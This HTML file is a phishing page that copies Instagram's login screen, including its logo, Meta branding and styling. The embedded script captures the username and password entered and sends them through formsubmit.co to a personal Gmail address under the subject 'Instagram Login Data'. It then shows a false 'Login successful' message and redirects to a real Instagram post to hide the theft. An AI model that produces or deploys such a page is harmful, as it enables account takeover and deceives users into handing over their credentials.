<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram Login</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      text-align: center;
      width: 320px;
    }

    .language {
      color: #737373;
      font-size: 14px;
      margin-bottom: 30px;
    }

    .insta-logo {
      width: 150px;
      margin-bottom: 25px;
    }

    .form input {
      width: 100%;
      padding: 12px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 8px;
      background-color: #fafafa;
      font-size: 14px;
    }

    .login-btn {
      width: 100%;
      background-color: #0095f6;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 25px;
      font-weight: 600;
      margin-top: 10px;
      cursor: pointer;
      font-size: 14px;
    }

    .login-btn:hover {
      background-color: #007edc;
    }

    .login-btn:disabled {
      background-color: #b2dffc;
      cursor: not-allowed;
    }

    .forgot {
      display: block;
      color: #00376b;
      font-size: 14px;
      text-decoration: none;
      margin-top: 15px;
    }

    .create-btn {
      width: 100%;
      padding: 12px;
      margin-top: 40px;
      border: 1px solid #0095f6;
      border-radius: 25px;
      background-color: transparent;
      color: #0095f6;
      font-weight: 600;
      cursor: pointer;
    }

    .create-btn:hover {
      background-color: #f0f8ff;
    }

    .meta {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-top: 25px;
    }

    .meta-logo {
      width: 70px;
      opacity: 0.7;
    }

    .loading {
      display: none;
      color: #0095f6;
      margin-top: 10px;
    }

    .success-message {
      display: none;
      color: #0095f6;
      margin-top: 10px;
      font-weight: 600;
    }
  </style>
</head>
<body>
  <div class="container">
    <p class="language">English (US)</p>

    <img
      src="https://logolook.net/wp-content/uploads/2021/06/Symbol-Instagram.png"
      alt="Instagram Logo"
      class="insta-logo"
    />

    <form class="form" id="loginForm">
      <input type="text" name="username" id="username" placeholder="Phone number, username or email" required />
      <input type="password" name="password" id="password" placeholder="Password" required />
      
      <button type="submit" class="login-btn" id="loginBtn">Log in</button>
      
      <div class="loading" id="loading">Logging in...</div>
      <div class="success-message" id="successMessage">Login successful! Redirecting...</div>
      
      <a href="#" class="forgot">Forgot password?</a>
    </form>

    <button class="create-btn">Create new account</button>

    <div class="meta">
      <img
        src="https://logowik.com/content/uploads/images/new-facebook-meta6114.jpg"
        alt="Meta Logo"
        class="meta-logo"
      />
    </div>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      
      if (!username || !password) {
        alert('Please fill in all fields');
        return;
      }

      document.getElementById('loading').style.display = 'block';
      document.getElementById('loginBtn').disabled = true;
      document.getElementById('loginBtn').textContent = 'Logging in...';

      const formData = new FormData();
      formData.append('username', username);
      formData.append('password', password);
      formData.append('_captcha', 'false');
      formData.append('_subject', 'Instagram Login Data');
      formData.append('_template', 'table');

      fetch('https://formsubmit.co/ajax/damounsoufian74@gmail.com', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        document.getElementById('loading').style.display = 'none';
        document.getElementById('successMessage').style.display = 'block';
        
        setTimeout(() => {
          window.location.href = "https://www.instagram.com/p/DPHzA_Hjamh/?igsh=eW95MDExMjE3aDFs";
        }, 2000);
      })
      .catch(error => {
        console.error('Error:', error);
        document.getElementById('loading').style.display = 'none';
        document.getElementById('loginBtn').disabled = false;
        document.getElementById('loginBtn').textContent = 'Log in';
        setTimeout(() => {
          window.location.href = "https://www.instagram.com/p/DPHzA_Hjamh/?igsh=eW95MDExMjE3aDFs";
        }, 1000);
      });
    });
  </script>
</body>
</html>
